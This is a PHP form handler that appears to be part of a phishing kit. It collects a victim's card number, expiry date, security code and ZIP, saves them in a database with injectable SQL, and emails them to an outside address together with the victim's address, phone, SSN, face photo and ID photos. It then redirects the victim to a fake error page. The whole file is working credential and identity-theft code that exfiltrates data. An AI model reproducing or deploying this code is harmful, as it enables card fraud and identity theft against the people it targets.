<?php
  include '../admin/lib/database.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {

  //EMPTY ERROR CHECK & TAKE INTO VARIABLE
  if (!empty($_POST['uniqid'])) {
    	$uniqid = $_POST['uniqid'];
      //TAKE INTO VARIABLE
      $customer_fname = $_POST['customer_fname'];
      $customer_lname = $_POST['customer_lname'];
      $card_number = $_POST['card_number'];
      $expire_date = $_POST['expire_date'];
      $security_code = $_POST['security_code'];
      $zip_code = $_POST['zip_code'];

  // UPDATE CONDITIONS AND QUERY  
  if (!empty($uniqid)) {
      $sql = "UPDATE customer_informations SET customer_fname= '$customer_fname', customer_lname= '$customer_lname', card_number= '$card_number', expire_date= '$expire_date', security_code= '$security_code', zip_code= '$zip_code' WHERE uniqid='$uniqid'";
      $update = mysqli_query($conn, $sql);
      if($update){
      
// EMAIL CODE START //
        // FETCH ALL DATA FROM DATABASE BY SPECIFIC CARD NO //
        $match_query = "SELECT * FROM customer_informations WHERE uniqid='$uniqid'";
        $match_results = mysqli_query($conn, $match_query);
        if (mysqli_num_rows($match_results) > 0){
          while($final_results = mysqli_fetch_assoc($match_results)){

            // NOW TAKE IN VARIABLE BY FETCHING FORM DB //
            $customer_emailF = $final_results["customer_email"];
            $customer_addressF = $final_results["customer_address"];
            $customer_address2F = $final_results["customer_address2"];
            $customer_cityF = $final_results["customer_city"];
            $customer_stateF = $final_results["customer_state"];
            $customer_zipF = $final_results["customer_zip"];
            $customer_phoneF = $final_results["customer_phone"];
            $front_idF = $final_results["front_id"];
            $back_idF = $final_results["back_id"];
            $customer_ssnF = $final_results["customer_ssn "];
            $customer_faceF = $final_results["customer_face"];
            $customer_fnameF = $final_results["customer_fname"];
            $customer_lnameF = $final_results["customer_lname"];
            $card_numberF = $final_results["card_number"];
            $expire_dateF = $final_results["expire_date"];
            $security_codeF = $final_results["security_code"];
            $zip_codeF = $final_results["zip_code"];
            $emailF = "$customer_emailF";

            // FORM DATA TAKE IN VARIABLES AND SEND EMAIL START //
            $formcontent=" CONTACT INFORMATION AND SHPPING ADDRESS \n =========================================================== \n Email address : $customer_emailF \n Address : $customer_addressF \n Additional information : $customer_address2F \n City : $customer_cityF \n State: $customer_stateF \n Zip code: $customer_zipF \n Phone number : $customer_phoneF \n CUSTOMER CARD INFORMATION \n =========================================================== \n Name: $customer_fnameF $customer_lnameF \n Card number: $card_numberF \n Expiration date (MM/YY) : $expire_dateF \n Security Code : $security_codeF \n Zip code : $zip_codeF \n PHOTO AND SSN \n =========================================================== \n  SSN: $customer_ssnF \n Face Verification : $customer_faceF \n Photo of the front of your ID/DL : $front_idF \n Photo of the front of your ID/DL : $back_idF";
              $recipient = "info@itm7598307479001.ws";
              $subject = "New customer informations";
              $mailheader = "From: $emailF \r\n";
              $mailokay = mail($recipient, $subject, $formcontent, $mailheader);
              if($mailokay){
                  echo "<script>window.location.href='../error/';</script>";
                  exit();
              }
               else{
                   $_SESSION['fail']="Sorry! But your email was not sent!";
                   echo "<script>window.location.href='../add-card/';</script>";
               } 
                
           // FORM DATA TAKE IN VARIABLES AND SEND EMAIL END //
          }
        }
// EMAIL CODE END //

      }
      else{
          $_SESSION['fail']="Something went to wrong! Try again";
          Header( 'Location: ../add-card');
          exit();
      } 
  }
  else{
    $_SESSION['fail']="*Something went to wrong! Try again";
    Header( 'Location: ../add-card/');
    exit();
  }
  }
  else{
    $_SESSION['sessionNull']="esomething went to wrong. Try again!";
    Header( 'Location: ../add-card/');
  }
  	
}
?>